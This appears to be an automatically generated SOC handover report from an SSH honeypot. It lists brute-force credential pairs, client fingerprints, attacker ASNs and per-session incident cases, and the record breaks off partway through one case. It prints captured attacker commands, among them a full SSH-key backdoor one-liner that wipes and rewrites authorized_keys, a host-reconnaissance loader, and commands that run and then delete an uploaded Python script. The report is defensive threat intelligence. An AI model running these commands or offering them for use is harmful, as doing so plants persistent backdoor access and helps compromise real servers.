# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-02 |
| **Generated At** | 2026-08-02T06:38:19Z |
| **Shift Time** | 06:38 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **289** |
| Confirmed Threats | **280** |
| False Positives Filtered | **9** (3.1%) |
| Unique Attacker IPs | **64** |
| Countries of Origin | **21** |
| High Severity Cases | **171** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **118** |
| Malware Samples Analyzed | **4** HIGH · **26** MED · 16 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **183** |
| Unique Credential Pairs | **150** |
| Unique Usernames | **58** |
| Unique Passwords | **107** |
| Successful Auth Pairs | **170** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 33 |
| `postgres` | 32 |
| `oracle` | 24 |
| `support` | 9 |
| `admin` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 6 |
| `LeitboGi0ro` | 5 |
| `pass` | 5 |
| `123` | 5 |
| `admin` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `LeitboGi0ro` | 5 |
| `admin` | `admin` | 4 |
| `root` | `` | 4 |
| `support` | `Passw0rd` | 4 |
| `debian` | `debian12345` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123@@@` | `168.110.102.254` | 2026-08-02T02:58:57 |
| `root` | `LeitboGi0ro` | `168.110.102.254` | 2026-08-02T02:58:57 |
| `admin` | `admin` | `116.99.49.208` | 2026-08-02T03:03:41 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-02T03:03:42 |
| `unknown` | `pass` | `195.222.57.183` | 2026-08-02T03:04:17 |
| `unknown` | `pass` | `117.248.201.39` | 2026-08-02T03:04:24 |
| `test1` | `test1` | `193.32.162.42` | 2026-08-02T03:05:02 |
| `test2` | `test2` | `193.32.162.42` | 2026-08-02T03:06:07 |
| `test3` | `test3` | `193.32.162.42` | 2026-08-02T03:07:16 |
| `root` | `root123` | `193.32.162.42` | 2026-08-02T03:08:25 |
| `root` | `55555555` | `122.176.45.238` | 2026-08-02T03:08:46 |
| `root` | `root321` | `193.32.162.42` | 2026-08-02T03:09:35 |
| `root` | `123` | `193.32.162.42` | 2026-08-02T03:10:42 |
| `root` | `321` | `193.32.162.42` | 2026-08-02T03:11:51 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.78.156.244` | 2026-08-02T03:12:31 |
| `*1` | `$4` | `34.78.156.244` | 2026-08-02T03:12:44 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 7755` | `34.78.156.244` | 2026-08-02T03:12:46 |
| `root` | `pass` | `193.32.162.42` | 2026-08-02T03:12:56 |
| `root` | `qwerty` | `193.32.162.42` | 2026-08-02T03:14:02 |
| `sol` | `sol` | `2.57.122.238` | 2026-08-02T03:14:23 |
| `root` | `password` | `193.32.162.42` | 2026-08-02T03:15:08 |
| `support` | `support` | `10.0.0.73` | 2026-08-02T03:15:33 |
| `solana` | `solana` | `2.57.122.238` | 2026-08-02T03:16:02 |
| `root` | `111111` | `193.32.162.42` | 2026-08-02T03:16:15 |
| `postgres` | `postgres` | `193.32.162.42` | 2026-08-02T03:17:23 |
| `ethdocker` | `ethdocker` | `2.57.122.238` | 2026-08-02T03:17:38 |
| `oracle` | `oracle` | `193.32.162.42` | 2026-08-02T03:18:32 |
| `eth-docker` | `eth-docker` | `2.57.122.238` | 2026-08-02T03:19:11 |
| `user` | `user` | `193.32.162.42` | 2026-08-02T03:19:44 |
| `eth_docker` | `eth_docker` | `2.57.122.238` | 2026-08-02T03:20:45 |
| `wpyan` | `wpyan` | `193.32.162.42` | 2026-08-02T03:20:53 |
| `jira` | `jira` | `193.32.162.42` | 2026-08-02T03:21:59 |
| `raydium` | `raydium` | `2.57.122.238` | 2026-08-02T03:22:13 |
| `vps` | `vps` | `193.32.162.42` | 2026-08-02T03:23:01 |
| `firedancer` | `firedancer` | `2.57.122.238` | 2026-08-02T03:23:42 |
| `uftp` | `uftp` | `193.32.162.42` | 2026-08-02T03:24:09 |
| `node` | `node` | `2.57.122.238` | 2026-08-02T03:25:15 |
| `testuser` | `testuser` | `193.32.162.42` | 2026-08-02T03:25:29 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-02T03:26:49 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-02T03:26:49 |
| `node` | `1234` | `2.57.122.238` | 2026-08-02T03:26:50 |
| `zhouh` | `zhouh` | `193.32.162.42` | 2026-08-02T03:27:17 |
| `node` | `123456` | `2.57.122.238` | 2026-08-02T03:28:27 |
| `pul` | `pul` | `193.32.162.42` | 2026-08-02T03:28:37 |
| `yuanwd` | `yuanwd` | `193.32.162.42` | 2026-08-02T03:29:44 |
| `ethereum` | `ethereum` | `2.57.122.238` | 2026-08-02T03:30:02 |
| `server` | `server` | `193.32.162.42` | 2026-08-02T03:30:49 |
| `eth` | `eth` | `2.57.122.238` | 2026-08-02T03:31:40 |
| `hadoop` | `hadoop` | `193.32.162.42` | 2026-08-02T03:31:57 |
| `support` | `951951` | `31.173.0.46` | 2026-08-02T03:33:03 |
| `git` | `git` | `193.32.162.42` | 2026-08-02T03:33:07 |
| `support` | `951951` | `101.13.4.119` | 2026-08-02T03:33:11 |
| `polygon` | `polygon` | `2.57.122.238` | 2026-08-02T03:33:16 |
| `deploy` | `deploy` | `193.32.162.42` | 2026-08-02T03:34:16 |
| `tron` | `tron` | `2.57.122.238` | 2026-08-02T03:34:47 |
| `test` | `test` | `193.32.162.42` | 2026-08-02T03:35:20 |
| `trx` | `trx` | `2.57.122.238` | 2026-08-02T03:36:17 |
| `nagios` | `nagios` | `193.32.162.42` | 2026-08-02T03:36:27 |
| `guest` | `guest` | `193.32.162.42` | 2026-08-02T03:37:33 |
| `validator` | `ethereum` | `2.57.122.238` | 2026-08-02T03:37:49 |
| `weblogic` | `weblogic` | `193.32.162.42` | 2026-08-02T03:38:41 |
| `supervisor` | `123123123` | `115.245.122.146` | 2026-08-02T03:38:51 |
| `supervisor` | `123123123` | `125.25.183.157` | 2026-08-02T03:39:00 |
| `sepolia` | `sepolia` | `2.57.122.238` | 2026-08-02T03:39:25 |
| `mysql` | `mysql` | `193.32.162.42` | 2026-08-02T03:39:45 |
| `apache` | `apache` | `193.32.162.42` | 2026-08-02T03:40:46 |
| `avalanche` | `avalanche` | `2.57.122.238` | 2026-08-02T03:41:00 |
| `postgres` | `123456` | `193.32.162.42` | 2026-08-02T03:41:54 |
| `solv` | `solv` | `2.57.122.238` | 2026-08-02T03:42:34 |
| `postgres` | `654321` | `193.32.162.42` | 2026-08-02T03:43:12 |
| `default` | `default12` | `178.178.194.131` | 2026-08-02T03:43:47 |
| `solv` | `1234` | `2.57.122.238` | 2026-08-02T03:44:12 |
| `postgres` | `123` | `193.32.162.42` | 2026-08-02T03:45:01 |
| `solv` | `123456` | `2.57.122.238` | 2026-08-02T03:45:52 |
| `postgres` | `321` | `193.32.162.42` | 2026-08-02T03:47:04 |
| `solv` | `12345678` | `2.57.122.238` | 2026-08-02T03:47:25 |
| `postgres` | `test` | `193.32.162.42` | 2026-08-02T03:48:11 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.53.205.84` | 2026-08-02T03:48:52 |
| `*1` | `$4` | `34.53.205.84` | 2026-08-02T03:49:05 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 4450` | `34.53.205.84` | 2026-08-02T03:49:07 |
| `postgres` | `test123` | `193.32.162.42` | 2026-08-02T03:49:19 |
| `postgres` | `test321` | `193.32.162.42` | 2026-08-02T03:50:23 |
| `postgres` | `password` | `193.32.162.42` | 2026-08-02T03:51:32 |
| `ubuntu` | `ubuntu` | `2.57.122.238` | 2026-08-02T03:52:05 |
| `postgres` | `passwd` | `193.32.162.42` | 2026-08-02T03:52:34 |
| `postgres` | `pass` | `193.32.162.42` | 2026-08-02T03:53:37 |
| `validator` | `validator` | `2.57.122.238` | 2026-08-02T03:53:39 |
| `postgres` | `P@ssw0rd` | `193.32.162.42` | 2026-08-02T03:54:43 |
| `sol` | `sol123` | `2.57.122.238` | 2026-08-02T03:55:10 |
| `postgres` | `qwe123` | `193.32.162.42` | 2026-08-02T03:55:59 |
| `user` | `007` | `10.0.0.73` | 2026-08-02T03:56:33 |
| `sol` | `123` | `2.57.122.238` | 2026-08-02T03:56:47 |
| `postgres` | `qwer1234` | `193.32.162.42` | 2026-08-02T03:57:26 |
| `sol` | `12345678` | `2.57.122.238` | 2026-08-02T03:58:28 |
| `postgres` | `password123` | `193.32.162.42` | 2026-08-02T03:59:09 |
| `trading` | `trading` | `2.57.122.238` | 2026-08-02T04:00:06 |
| `postgres` | `qwerty123456` | `193.32.162.42` | 2026-08-02T04:01:12 |
| `trader` | `trader` | `2.57.122.238` | 2026-08-02T04:01:38 |
| `postgres` | `1234qwer` | `193.32.162.42` | 2026-08-02T04:02:18 |
| `tradingbot` | `tradingbot` | `2.57.122.238` | 2026-08-02T04:03:13 |
| `postgres` | `123qwe` | `193.32.162.42` | 2026-08-02T04:03:23 |
| `postgres` | `passpass` | `193.32.162.42` | 2026-08-02T04:04:24 |
| `bot` | `bot` | `2.57.122.238` | 2026-08-02T04:04:51 |
| `postgres` | `pass123` | `193.32.162.42` | 2026-08-02T04:05:25 |
| `bot` | `123456` | `2.57.122.238` | 2026-08-02T04:06:26 |
| `postgres` | `pass1234` | `193.32.162.42` | 2026-08-02T04:06:30 |
| `postgres` | `wasd` | `193.32.162.42` | 2026-08-02T04:07:39 |
| `bot` | `12345` | `2.57.122.238` | 2026-08-02T04:07:59 |
| `postgres` | `qwerty` | `193.32.162.42` | 2026-08-02T04:09:03 |
| `postgres` | `q1w2e3` | `193.32.162.42` | 2026-08-02T04:10:55 |
| `postgres` | `q1w2e3r4` | `193.32.162.42` | 2026-08-02T04:13:04 |
| `postgres` | `1q2w3e` | `193.32.162.42` | 2026-08-02T04:14:07 |
| `postgres` | `1q2w3e4r` | `193.32.162.42` | 2026-08-02T04:15:10 |
| `postgres` | `111111` | `193.32.162.42` | 2026-08-02T04:16:20 |
| `postgres` | `qwerty123` | `193.32.162.42` | 2026-08-02T04:17:40 |
| `supervisor` | `alpine` | `220.80.223.144` | 2026-08-02T04:18:22 |
| `supervisor` | `alpine` | `221.199.172.66` | 2026-08-02T04:18:35 |
| `default` | `p@ssword` | `187.115.144.103` | 2026-08-02T04:19:07 |
| `postgres` | `123321` | `193.32.162.42` | 2026-08-02T04:19:12 |
| `postgres` | `321123` | `193.32.162.42` | 2026-08-02T04:21:13 |
| `postgres` | `p@ssw0rd` | `193.32.162.42` | 2026-08-02T04:23:09 |
| `root` | `123@@@` | `144.22.238.238` | 2026-08-02T04:23:30 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-08-02T04:23:31 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-08-02T04:23:40 |
| `oracle` | `123456` | `193.32.162.42` | 2026-08-02T04:24:14 |
| `support` | `Passw0rd` | `10.0.0.73` | 2026-08-02T04:24:23 |
| `oracle` | `654321` | `193.32.162.42` | 2026-08-02T04:25:21 |
| `support` | `Passw0rd` | `50.217.255.171` | 2026-08-02T04:26:01 |
| `support` | `Passw0rd` | `1.247.245.61` | 2026-08-02T04:26:13 |
| `oracle` | `123` | `193.32.162.42` | 2026-08-02T04:26:37 |
| `oracle` | `321` | `193.32.162.42` | 2026-08-02T04:28:14 |
| `root` | `111111` | `2.57.122.168` | 2026-08-02T04:28:34 |
| `oracle` | `test` | `193.32.162.42` | 2026-08-02T04:30:08 |
| `root` | `123` | `2.57.122.168` | 2026-08-02T04:31:01 |
| `oracle` | `test123` | `193.32.162.42` | 2026-08-02T04:31:53 |
| `oracle` | `test321` | `193.32.162.42` | 2026-08-02T04:32:57 |
| `root` | `123123` | `2.57.122.168` | 2026-08-02T04:33:24 |
| `oracle` | `password` | `193.32.162.42` | 2026-08-02T04:33:56 |
| `oracle` | `passwd` | `193.32.162.42` | 2026-08-02T04:34:59 |
| `root` | `123321` | `2.57.122.168` | 2026-08-02T04:36:01 |
| `oracle` | `pass` | `193.32.162.42` | 2026-08-02T04:36:07 |
| `oracle` | `P@ssw0rd` | `193.32.162.42` | 2026-08-02T04:37:25 |
| `oracle` | `qwe123` | `193.32.162.42` | 2026-08-02T04:38:55 |
| `root` | `1234` | `2.57.122.168` | 2026-08-02T04:39:02 |
| `oracle` | `qwer1234` | `193.32.162.42` | 2026-08-02T04:40:45 |
| `root` | `12345` | `2.57.122.168` | 2026-08-02T04:41:50 |
| `oracle` | `password123` | `193.32.162.42` | 2026-08-02T04:42:53 |
| `oracle` | `qwerty123456` | `193.32.162.42` | 2026-08-02T04:43:59 |
| `oracle` | `1234qwer` | `193.32.162.42` | 2026-08-02T04:44:58 |
| `oracle` | `123qwe` | `193.32.162.42` | 2026-08-02T04:46:00 |
| `oracle` | `passpass` | `193.32.162.42` | 2026-08-02T04:47:02 |
| `root` | `1234567` | `2.57.122.168` | 2026-08-02T04:47:08 |
| `oracle` | `pass123` | `193.32.162.42` | 2026-08-02T04:48:05 |
| `support` | `support` | `176.53.159.196` | 2026-08-02T04:48:14 |
| `default` | `p@ssword` | `178.178.194.128` | 2026-08-02T04:48:32 |
| `default` | `p@ssword` | `222.92.61.242` | 2026-08-02T04:48:42 |
| `oracle` | `pass1234` | `193.32.162.42` | 2026-08-02T04:49:14 |
| `admin` | `admin` | `10.0.0.73` | 2026-08-02T04:49:29 |
| `root` | `12345678` | `2.57.122.168` | 2026-08-02T04:50:03 |
| `oracle` | `wasd` | `193.32.162.42` | 2026-08-02T04:50:27 |
| `oracle` | `qwerty` | `193.32.162.42` | 2026-08-02T04:51:49 |
| `root` | `123456789` | `2.57.122.168` | 2026-08-02T04:52:43 |
| `debian` | `debian12345` | `49.206.201.253` | 2026-08-02T04:53:09 |
| `debian` | `debian12345` | `64.72.74.162` | 2026-08-02T04:53:16 |
| `oracle` | `q1w2e3` | `193.32.162.42` | 2026-08-02T04:53:22 |
| `debian` | `debian12345` | `80.233.12.109` | 2026-08-02T04:53:28 |
| `debian` | `debian12345` | `112.28.73.142` | 2026-08-02T04:53:38 |
| `barman` | `barman` | `209.99.189.177` | 2026-08-02T04:54:10 |
| `345gs5662d34` | `345gs5662d34` | `209.99.189.177` | 2026-08-02T04:54:12 |
| `barman` | `3245gs5662d34` | `209.99.189.177` | 2026-08-02T04:54:13 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **289** |
| Sessions with Fingerprint | **15** |
| Unique HASSH Fingerprints | **15** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 137 |
| OpenSSH | 21 |
| libssh | 10 |
| Paramiko (Python) | 10 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 97 | 2 |
| `16443846184e...` | Generic scanner | 35 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 19 | 19 |
| `a2de0f306611...` | Mirai/variant | 6 | 2 |
| `6372ee695756...` | Modern SSH client | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 97 | 2 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 35 | 1 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 19 | 19 | Mirai/variant |
| `95420f9d932d...` | libssh | 6 | 2 | — |
| `a2de0f306611...` | Paramiko (Python) | 6 | 2 | Mirai/variant |
| `6372ee695756...` | Paramiko (Python) | 4 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
| `f1e5e9d24e5e...` | Go SSH scanner | 2 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 95 | 2 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `193.32.162.42`, `2.57.122.168`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `209.99.189.177`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **64** |
| Unique ASNs | **46** |
| High-Risk ASNs | **43** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 4 | HIGH |
| `AS22773` | Cox Communications Inc. | 3 | MEDIUM |
| `AS25159` | PJSC MegaFon | 3 | HIGH |
| `AS47890` | UNMANAGED LTD | 3 | HIGH |
| `AS46562` | Performive LLC | 3 | MEDIUM |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS25369` | Hydra Communications Ltd | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (171)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-83fe85e11c06

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-08-02 02:58 |
| **Last Seen** | 2026-08-02 02:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 02:58:56` | `cowrie.session.connect` |
| `2026-08-02 02:58:56` | `cowrie.client.version` |
| `2026-08-02 02:58:56` | `cowrie.client.kex` |
| `2026-08-02 02:58:57` | `cowrie.login.success` |
| `2026-08-02 02:58:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2889b1b06351

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-08-02 02:58 |
| **Last Seen** | 2026-08-02 02:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 02:58:56` | `cowrie.session.connect` |
| `2026-08-02 02:58:56` | `cowrie.client.version` |
| `2026-08-02 02:58:57` | `cowrie.client.kex` |
| `2026-08-02 02:58:57` | `cowrie.login.success` |
| `2026-08-02 02:58:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f00ab84d4b00

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-08-02 02:59 |
| **Last Seen** | 2026-08-02 03:01 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 02:59:16` | `cowrie.session.connect` |
| `2026-08-02 02:59:16` | `cowrie.client.version` |
| `2026-08-02 02:59:17` | `cowrie.client.kex` |
| `2026-08-02 02:59:17` | `cowrie.login.success` |
| `2026-08-02 02:59:19` | `cowrie.session.file_upload` |
| `2026-08-02 02:59:20` | `cowrie.session.params` |
| `2026-08-02 02:59:20` | `cowrie.command.input` |
| `2026-08-02 02:59:20` | `cowrie.command.input` |
| `2026-08-02 02:59:20` | `cowrie.command.input` |
| `2026-08-02 02:59:20` | `cowrie.command.failed` |
| `2026-08-02 02:59:21` | `cowrie.log.closed` |
| `2026-08-02 02:59:22` | `cowrie.session.params` |
| `2026-08-02 02:59:22` | `cowrie.command.input` |
| `2026-08-02 02:59:22` | `cowrie.log.closed` |
| `2026-08-02 02:59:23` | `cowrie.session.params` |
| `2026-08-02 02:59:23` | `cowrie.command.input` |
| `2026-08-02 02:59:23` | `cowrie.log.closed` |
| `2026-08-02 02:59:24` | `cowrie.session.params` |
| `2026-08-02 02:59:24` | `cowrie.command.input` |
| `2026-08-02 02:59:24` | `cowrie.command.failed` |
| `2026-08-02 02:59:24` | `cowrie.command.failed` |
| `2026-08-02 03:00:25` | `cowrie.session.params` |
| `2026-08-02 03:00:25` | `cowrie.command.input` |
| `2026-08-02 03:01:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ef52fcd199b

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-08-02 03:01 |
| **Last Seen** | 2026-08-02 03:03 |
| **Session Duration** | 130s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:01:41` | `cowrie.session.connect` |
| `2026-08-02 03:01:41` | `cowrie.client.version` |
| `2026-08-02 03:01:42` | `cowrie.client.kex` |
| `2026-08-02 03:01:42` | `cowrie.login.success` |
| `2026-08-02 03:01:45` | `cowrie.session.file_upload` |
| `2026-08-02 03:01:46` | `cowrie.session.params` |
| `2026-08-02 03:01:46` | `cowrie.command.input` |
| `2026-08-02 03:01:46` | `cowrie.command.input` |
| `2026-08-02 03:01:46` | `cowrie.command.input` |
| `2026-08-02 03:01:46` | `cowrie.command.failed` |
| `2026-08-02 03:01:46` | `cowrie.log.closed` |
| `2026-08-02 03:01:47` | `cowrie.session.params` |
| `2026-08-02 03:01:47` | `cowrie.command.input` |
| `2026-08-02 03:01:47` | `cowrie.log.closed` |
| `2026-08-02 03:01:48` | `cowrie.session.params` |
| `2026-08-02 03:01:48` | `cowrie.command.input` |
| `2026-08-02 03:01:48` | `cowrie.log.closed` |
| `2026-08-02 03:01:49` | `cowrie.session.params` |
| `2026-08-02 03:01:49` | `cowrie.command.input` |
| `2026-08-02 03:01:49` | `cowrie.command.failed` |
| `2026-08-02 03:01:49` | `cowrie.command.failed` |
| `2026-08-02 03:02:50` | `cowrie.session.params` |
| `2026-08-02 03:02:50` | `cowrie.command.input` |
| `2026-08-02 03:03:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c63fdd92c4c

| Field | Detail |
|---|---|
| **Source IP** | `116.99.49[.]208` |
| **First Seen** | 2026-08-02 03:03 |
| **Last Seen** | 2026-08-02 03:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:03:37` | `cowrie.session.connect` |
| `2026-08-02 03:03:37` | `cowrie.client.version` |
| `2026-08-02 03:03:38` | `cowrie.client.kex` |
| `2026-08-02 03:03:41` | `cowrie.login.success` |
| `2026-08-02 03:03:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.49[.]208` to AbuseIPDB if not already reported
- [ ] Block `116.99.49[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16df10da6d82

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-02 03:03 |
| **Last Seen** | 2026-08-02 03:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:03:42` | `cowrie.session.connect` |
| `2026-08-02 03:03:42` | `cowrie.client.version` |
| `2026-08-02 03:03:42` | `cowrie.client.kex` |
| `2026-08-02 03:03:42` | `cowrie.login.success` |
| `2026-08-02 03:03:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f2a7f0c162c

| Field | Detail |
|---|---|
| **Source IP** | `195.222.57[.]183` |
| **First Seen** | 2026-08-02 03:04 |
| **Last Seen** | 2026-08-02 03:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:04:16` | `cowrie.session.connect` |
| `2026-08-02 03:04:16` | `cowrie.client.version` |
| `2026-08-02 03:04:16` | `cowrie.client.kex` |
| `2026-08-02 03:04:17` | `cowrie.login.success` |
| `2026-08-02 03:04:17` | `cowrie.direct-tcpip.request` |
| `2026-08-02 03:04:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.222.57[.]183` to AbuseIPDB if not already reported
- [ ] Block `195.222.57[.]183` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-954d8046fea6

| Field | Detail |
|---|---|
| **Source IP** | `117.248.201[.]39` |
| **First Seen** | 2026-08-02 03:04 |
| **Last Seen** | 2026-08-02 03:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:04:22` | `cowrie.session.connect` |
| `2026-08-02 03:04:22` | `cowrie.client.version` |
| `2026-08-02 03:04:22` | `cowrie.client.kex` |
| `2026-08-02 03:04:24` | `cowrie.login.success` |
